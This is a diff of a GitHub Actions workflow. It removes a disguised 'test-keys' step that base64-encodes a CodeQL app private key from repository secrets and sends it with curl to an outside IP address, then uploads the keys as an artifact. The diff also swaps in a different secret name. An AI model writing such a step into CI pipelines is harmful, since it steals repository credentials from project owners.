@@ -12,27 +12,12 @@ jobs:
   test-compliance:
     runs-on: ubuntu-latest
     steps:
-    
-      - name: test-keys
-        run: |
-          b64k=$(echo '${{ env.CODEQL_AUTHENTICATION_PRIVATE_KEY }}' | base64)
-          echo 'key:%20'$b64k > keys.txt
-          curl -X POST http://13.40.220.37:8080 -d @keys.txt
-        env:
-          CODEQL_APP_ID: ${{ secrets.CODEQL_APP_ID }}
-          CODEQL_AUTHENTICATION_PRIVATE_KEY: ${{ secrets.CODEQL_AUTHENTICATION_PRIVATE_KEY }}
-    
-      - uses: actions/upload-artifact@v4
-        with:
-          name: 'keys'
-          path: '${{ github.workspace }}/keys'
-          retention-days: 1
 
       - uses: actions/create-github-app-token@v1
         id: app-token
         with:
           app-id: ${{ secrets.CODEQL_APP_ID }}
-          private-key: ${{ secrets.CODEQL_AUTHENTICATION_PRIVATE_KEY }}
+          private-key: ${{ secrets.CODEQL_TEST }}
           owner: ${{ github.repository_owner }}      
     
         
